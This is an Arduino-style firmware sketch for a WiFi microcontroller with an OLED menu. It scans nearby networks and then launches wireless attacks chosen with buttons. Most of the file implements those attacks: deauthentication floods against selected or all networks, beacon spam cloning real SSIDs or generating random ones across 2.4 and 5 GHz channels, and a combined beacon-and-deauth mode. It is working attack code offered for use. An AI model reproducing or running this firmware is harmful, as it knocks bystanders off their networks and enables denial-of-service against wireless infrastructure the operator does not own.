// Oled code made by warwick320

#undef max
#undef min
#include "vector"
#include "wifi_conf.h"
#include "map"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "debug.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"
#include <Wire.h>              
#include <Adafruit_GFX.h>      
#include <Adafruit_SSD1306.h>
//#include <Arduino.h>

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
#define BTN_DOWN PA12
#define BTN_UP PA27
#define BTN_OK PA13
#define BTN_BACK PB2
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  
  short rssi;
  uint channel;
} WiFiScanResult;
bool Break = false;
char *ssid = "Warwick";
char *pass = "warwickisbest";
int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
WiFiServer server(80);

std::vector<int> SelectedVector;

bool deauth_running = false;
uint8_t deauth_bssid[6];
uint8_t becaon_bssid[6];
uint16_t deauth_reason;
void CD(){
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
}
rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) { 
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char*) record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}
int scanNetworks() {
  DEBUG_SER_PRINT("Scanning WiFi networks (5s)...");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(5000);
    DEBUG_SER_PRINT(" done!\n");
    return 0;
  } else {
    DEBUG_SER_PRINT(" failed!\n");
    return 1;
  }
}
String SelectedSSID;
String SSIDCh;
void setup(){
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_OK, INPUT_PULLUP);
  pinMode(BTN_BACK, INPUT_PULLUP);
  Serial.begin(115200);
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println(F("SSD1306 init failed"));
    while (true);  
  }
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(20,20);
  display.println("Scanning..");
  display.setCursor(20,35);
  display.println("by warwick320");
  display.display();
  DEBUG_SER_INIT();
  WiFi.apbegin(ssid, pass, (char *) String(current_channel).c_str());
  if (scanNetworks() != 0) {
    while(true) delay(1000);
  }

  #ifdef DEBUG
  for (uint i = 0; i < scan_results.size(); i++) {
    DEBUG_SER_PRINT(scan_results[i].ssid + " ");
    for (int j = 0; j < 6; j++) {
      if (j > 0) DEBUG_SER_PRINT(":");
      DEBUG_SER_PRINT(scan_results[i].bssid[j], HEX);
    }
    DEBUG_SER_PRINT(" " + String(scan_results[i].channel) + " ");
    DEBUG_SER_PRINT(String(scan_results[i].rssi) + "\n");
  }
  #endif
  SelectedSSID = scan_results[0].ssid;
  SSIDCh = scan_results[0].channel >= 36 ? "5G" : "2.4G";
}
int attackstate = 0;
int menustate = 0;
bool menuscroll = true;
bool okstate = true;
int scrollindex = 0;
int perdeauth = 3;
unsigned long BPT = 0;
const unsigned long HTH = 800; //hold
bool held = false;
//uint8_t becaon_bssid[6];
bool contains(std::vector<int>& vec,int value){
  for (int v : vec){
    if(v==value){
      return true;
    }
  }
  return false;
}

void addValue(std::vector<int>& vec,int value){
  if(!contains(vec, value)){
    vec.push_back(value);
  } else{
    Serial.print(value);
    Serial.println("Exits");
    for (auto IT = vec.begin(); IT != vec.end();){
      if(*IT == value){
        IT=vec.erase(IT);
      }
      else{
        ++IT;
      }
    }
    Serial.println("De-selected");
  }
}
void drawssid(){
  while(true){
    if(digitalRead(BTN_BACK)==LOW){
      delay(150);
      break;
    }
    if(digitalRead(BTN_DOWN)==LOW && digitalRead(BTN_UP)==LOW){
      delay(150);
      break;
    }
    if(digitalRead(BTN_OK)==LOW){
      delay(150);
      addValue(SelectedVector,scrollindex);
    }
    if(digitalRead(BTN_UP)==LOW){
      delay(150);
      if(BPT==0){
        BPT = millis();
        Serial.println(BPT);
      }
      if(millis()-BPT >= HTH){
        if(!held){
          held = true;
          Serial.println(held);
          break;
        }
      }
      if(scrollindex < scan_results.size() - 1){
        scrollindex++;
      }
      SelectedSSID = scan_results[scrollindex].ssid;
      SSIDCh = scan_results[scrollindex].channel >= 36 ? "5G" : "2.4G";
    }
    else{
      BPT = 0;
      if(held){
        held = false;
        break;
      }
    }
    if(digitalRead(BTN_DOWN)==LOW){
      delay(150);
      if(scrollindex > 0){
        scrollindex--;
      }
      SelectedSSID = scan_results[scrollindex].ssid;
      SSIDCh = scan_results[scrollindex].channel >= 36 ? "5G" : "2.4G";
    }
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(5, 25);
    if (SelectedSSID.length()==0){
      display.print("#HIDDEN#");
    }
    else if(SelectedSSID.length() > 13){
      SelectedSSID = SelectedSSID.substring(0,13) + "...";
      display.print(SelectedSSID);

    }
    else display.print(SelectedSSID);
    bool found = false;
    //auto it = std::find(SelectedVector.begin(),SelectedVector.end(),scrollindex); Fuck Arduino
    for(int i=0;i<SelectedVector.size();i++){
      if(SelectedVector[i]==scrollindex){
        found = true;
        break;
      }
    }
    if(found){
      display.setCursor(105, 25);
      display.println("[*]");
    }
    else{
      display.setCursor(105, 25);
      display.println("[ ]");
    }
    display.setCursor(5, 10);
    display.print(SSIDCh);
    display.display();
  }
}
void drawscan(){
  while(true){
    display.clearDisplay();
    display.setTextColor(SSD1306_WHITE);
    display.setTextSize(1);
    display.print("Scanning..(3~5s)");
    display.display();  
    if (scanNetworks() != 0) {
      while(true) delay(1000);
    }
    Serial.print("Done");
    display.clearDisplay();
    display.setCursor(5, 25);
    display.print("Done");
    display.display();
    delay(300);
    break;
  }
}
void Multi(){
  CD();
  display.setCursor(5, 25);
  display.println("Attacking...");
  display.display();
  while(true){
    if(Break){
      Break=false;
      break;
    }
    int num = 0;
    if(SelectedVector.size() == 0){
      SelectedVector.push_back(0);
    }
    while(SelectedVector.size()>0){
      if(digitalRead(BTN_OK)==LOW | digitalRead(BTN_BACK)==LOW){
        delay(150);
        Break = true;
        break;
      }
      memcpy(deauth_bssid,scan_results[SelectedVector[num]].bssid,6);
      wext_set_channel(WLAN0_NAME,scan_results[SelectedVector[num]].channel);
      num++;
      if(num >= SelectedVector.size()){
        num = 0;
      }
      for(int i = 0; i < 10; i++){
        wifi_tx_deauth_frame(deauth_bssid,(void *)"\xFF\xFF\xFF\xFF\xFF\xFF",0);
        delay(5);
      }
      delay(50);
    }
  }
}
void Single(){
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(5, 25);
  display.println("Single Attacking...");
  display.display();
  while(true){
    memcpy(deauth_bssid,scan_results[scrollindex].bssid,6);
    wext_set_channel(WLAN0_NAME,scan_results[scrollindex].channel);
    if(digitalRead(BTN_OK)==LOW | digitalRead(BTN_BACK)==LOW){
      delay(100);
      break;
    }
    deauth_reason = 1;
    wifi_tx_deauth_frame(deauth_bssid, (void *) "\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
    deauth_reason = 4;
    wifi_tx_deauth_frame(deauth_bssid, (void *) "\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
    deauth_reason = 16;
    wifi_tx_deauth_frame(deauth_bssid, (void *) "\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
  }
}
void All(){
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(5, 25);
  display.println("All Attacking...");
  display.display();
  while (true){
    if(Break){
      Break = false;
      break;
    }
    for(int i = 0; i<scan_results.size();i++){
      if(digitalRead(BTN_OK)==LOW | digitalRead(BTN_BACK)==LOW){
        delay(100);
        Break = true;
        break;
      }
      memcpy(deauth_bssid,scan_results[i].bssid,6);
      wext_set_channel(WLAN0_NAME,scan_results[i].channel);
      for(int x=0;x < perdeauth; x++){
        deauth_reason = 1;
        wifi_tx_deauth_frame(deauth_bssid, (void *) "\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
        deauth_reason = 4;
        wifi_tx_deauth_frame(deauth_bssid, (void *) "\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
        deauth_reason = 16;
        wifi_tx_deauth_frame(deauth_bssid, (void *) "\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
      }
    }
  }
}
void BecaonDeauth(){
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(5, 25);
  display.println("Becaon&Deauth Attacking...");
  display.display();
  while(true){
    if(Break){
      Break = false;
      break;
    }
    for(int i = 0; i<scan_results.size();i++){
      if(digitalRead(BTN_OK)==LOW | digitalRead(BTN_OK)==LOW){
        delay(100);
        Break = true;
        break;
      }
      String ssid1 = scan_results[i].ssid;
      const char * ssid1_cstr =ssid1.c_str();
      memcpy(becaon_bssid,scan_results[i].bssid,6);
      memcpy(deauth_bssid,scan_results[i].bssid,6);
      wext_set_channel(WLAN0_NAME,scan_results[i].channel);
      for(int x=0;x < 10;x++){
        wifi_tx_beacon_frame(becaon_bssid,(void *) "\xFF\xFF\xFF\xFF\xFF\xFF",ssid1_cstr);
        wifi_tx_deauth_frame(deauth_bssid,(void *) "\xFF\xFF\xFF\xFF\xFF\xFF",0);
      }    
    }
  }
}
void Becaon(){
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(5, 25);
  display.println("Becaon Attacking...");
  display.display();
  while(true){
    if(Break){
      Break = false;
      break;
    }
    for(int i = 0; i<scan_results.size();i++){
      if(digitalRead(BTN_OK)==LOW | digitalRead(BTN_BACK)==LOW){
        delay(100);
        Break = true;
        break;
      }
      String ssid1 = scan_results[i].ssid;
      const char * ssid1_cstr =ssid1.c_str();
      memcpy(becaon_bssid,scan_results[i].bssid,6);  
      wext_set_channel(WLAN0_NAME,scan_results[i].channel);
      for(int x=0;x < 10;x++){
        wifi_tx_beacon_frame(becaon_bssid,(void *) "\xFF\xFF\xFF\xFF\xFF\xFF",ssid1_cstr);
      }
    }    
  }
}
String generateRandomString(int len){
  String randstr = "";
  const char setchar[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  for (int i = 0; i < len; i++){
    int index = random(0,strlen(setchar));
    randstr += setchar[index];

  }
  return randstr;
}
char randomString[19];
int allChannels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 36, 40, 44, 48, 149, 153, 157, 161};
void RandomBeacon(){
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(5, 25);
  display.println("Random Becaon Attacking...");
  display.display();
  while (true){

    if(digitalRead(BTN_OK)==LOW | digitalRead(BTN_BACK)==LOW){
      delay(50);
      break;
    }
    int randomIndex = random(0, 19);
    int randomChannel = allChannels[randomIndex];
    String ssid2 = generateRandomString(10);
    for(int i=0;i<6;i++){
      byte randomByte = random(0x00, 0xFF);
      snprintf(randomString + i * 3, 4, "\\x%02X", randomByte);
    }
    
    const char * ssid_cstr2 = ssid2.c_str();
    //memcpy(randomString,scan_results[0].bssid,6);
    wext_set_channel(WLAN0_NAME,randomChannel);
    for(int x=0;x<5;x++){
      wifi_tx_beacon_frame(randomString,(void *) "\xFF\xFF\xFF\xFF\xFF\xFF",ssid_cstr2);
    }
  }
}
int becaonstate = 0;
void BecaonMenu(){
  while(true){
    if(digitalRead(BTN_BACK)==LOW){
      break;
    }
    if(digitalRead(BTN_OK)==LOW){
      delay(120);
      if(becaonstate == 0){
        RandomBeacon();
        break;
      }
      if(becaonstate == 1){
        Becaon();
        break;
      }
      if(becaonstate == 2){
        break;
      }
    }
    if(digitalRead(BTN_DOWN)==LOW){
      delay(120);
      if(becaonstate > 0){
        becaonstate--;
      }
    }
    if(digitalRead(BTN_UP)==LOW){
      delay(120);
      if(becaonstate < 2){
        becaonstate++;
      }
    }
    if(becaonstate == 0){
      delay(50);
      display.clearDisplay();
      display.setTextSize(1);
      display.setCursor(5, 5);
      selectedmenu("Random Beacon Attack");
      display.setCursor(5, 15);
      display.println("Same Beacon Attack");
      display.setCursor(5, 25);
      display.println("< Back >");
      display.display();      
    }
    if(becaonstate == 1){
      delay(50);
      display.clearDisplay();
      display.setTextSize(1);
      display.setCursor(5, 5);
      display.println("Random Beacon Attack");
      display.setCursor(5, 15);
      selectedmenu("Same Beacon Attack");
      display.setCursor(5, 25);
      display.println("< Back >");
      display.display();
    }
    if(becaonstate == 2){
      delay(50);
      display.clearDisplay();
      display.setTextSize(1);
      display.setCursor(5, 5);
      display.println("Random Beacon Attack");
      display.setCursor(5, 15);
      display.println("Same Beacon Attack");
      display.setCursor(5, 25);
      selectedmenu("< Back >");
      display.display();      
    }    
  }
}
void drawattack(){
  while(true){
    if(digitalRead(BTN_BACK)==LOW){
      break;
    }
    if(digitalRead(BTN_OK)==LOW){
      delay(150);
      if(attackstate == 0){
        Multi();
        break;
      }
      if(attackstate == 1){
        All();
        break;
      }
      if(attackstate == 2){
        BecaonMenu();
        break;
      }
      if(attackstate == 3){
        BecaonDeauth();
        break;
      }
      if(attackstate == 4){
        break;
      }
    }
    if(digitalRead(BTN_DOWN)==LOW){
      delay(120);
      if(attackstate > 0){
        attackstate--;
      }
    }
    if(digitalRead(BTN_UP)==LOW){
      delay(120);
      if(attackstate < 4){
        attackstate++;
      }
    }
    if (attackstate == 0){
      delay(50);
      display.clearDisplay();
      display.setTextSize(1);
      display.setCursor(5, 5);
      selectedmenu("Deauth Attack");
      display.setCursor(5, 15);
      display.println("All Deauth Attack");
      display.setCursor(5, 25);
      display.println("Becaon Attack");
      display.setCursor(5, 35);
      display.println("Becaon&Deauth Attack");
      display.setCursor(5, 45);
      display.println("< Back >");
      display.display();
    }
    if (attackstate == 1){
      delay(50);
      display.clearDisplay();
      display.setTextSize(1);
      display.setCursor(5, 5);
      display.println("Deauth Attack");
      display.setCursor(5, 15);
      selectedmenu("All Deauth Attack");
      display.setCursor(5, 25);
      display.println("Becaon Attack");
      display.setCursor(5, 35);
      display.println("Becaon&Deauth Attack");
      display.setCursor(5, 45);
      display.println("< Back >");
      display.display();
    }
    if (attackstate == 2){
      delay(50);
      display.clearDisplay();
      display.setTextSize(1);
      display.setCursor(5, 5);
      display.println("Deauth Attack");
      display.setCursor(5, 15);
      display.println("All Deauth Attack");
      display.setCursor(5, 25);
      selectedmenu("Becaon Attack");
      display.setCursor(5, 35);
      display.println("Becaon&Deauth Attack");
      display.setCursor(5, 45);
      display.println("< Back >");
      display.display();
    }
    if (attackstate == 3){
      delay(50);
      display.clearDisplay();
      display.setTextSize(1);
      display.setCursor(5, 5);
      display.println("Deauth Attack");
      display.setCursor(5, 15);
      display.println("All Deauth Attack");
      display.setCursor(5, 25);
      display.println("Becaon Attack");
      display.setCursor(5, 35);
      selectedmenu("Becaon&Deauth Attack");
      display.setCursor(5, 45);
      display.println("< Back >");
      display.display();
    }
    if (attackstate == 4){
      delay(50);
      display.clearDisplay();
      display.setTextSize(1);
      display.setCursor(5, 5);
      display.println("Deauth Attack");
      display.setCursor(5, 15);
      display.println("All Deauth Attack");
      display.setCursor(5, 25);
      display.println("Becaon Attack");
      display.setCursor(5, 35);
      display.println("Becaon&Deauth Attack");
      display.setCursor(5, 45);
      selectedmenu("< Back >");
      display.display();
    }
  }
}
void selectedmenu(String text){
  display.setTextColor(SSD1306_BLACK,SSD1306_WHITE);
  display.println(text);
  display.setTextColor(SSD1306_WHITE,SSD1306_BLACK);
}
void loop(){

  if(menustate == 0){
    delay(50);
    display.clearDisplay();
    display.setTextSize(1.7);
    display.setCursor(5, 10);
    selectedmenu("Attack");
    display.setCursor(5, 25);
    display.println("Scan");
    display.setCursor(5, 40);
    display.println("Select");
    display.display();
  }
  if(menustate == 1){
    delay(50);
    display.clearDisplay();
    display.setTextSize(1.7);
    display.setCursor(5, 10);
    display.println("Attack");
    display.setCursor(5, 25);
    selectedmenu("Scan");
    display.setCursor(5, 40);
    display.println("Select");
    display.display();
  }
  if(menustate == 2){
    delay(50);
    display.clearDisplay();
    display.setTextSize(1.7);
    display.setCursor(5, 10);
    display.println("Attack");
    display.setCursor(5, 25);
    display.println("Scan");
    display.setCursor(5, 40);
    selectedmenu("Select");
    display.display();
  }
  if(digitalRead(BTN_OK)==LOW){
    delay(150);
    if(okstate){
      if(menustate== 0){
        drawattack();
      }
      if(menustate== 1){
        drawscan();
      }
      if(menustate== 2){
        drawssid();
      }
    }
  }
  if(digitalRead(BTN_DOWN)==LOW){
    delay(150); 
    if(menuscroll){
      if(menustate > 0){
        menustate--;
      }
    }
  }
  if(digitalRead(BTN_UP)==LOW){
    delay(150);
    if(menuscroll){
      if(menustate < 2){
        menustate++;
      }
    }
  }
}
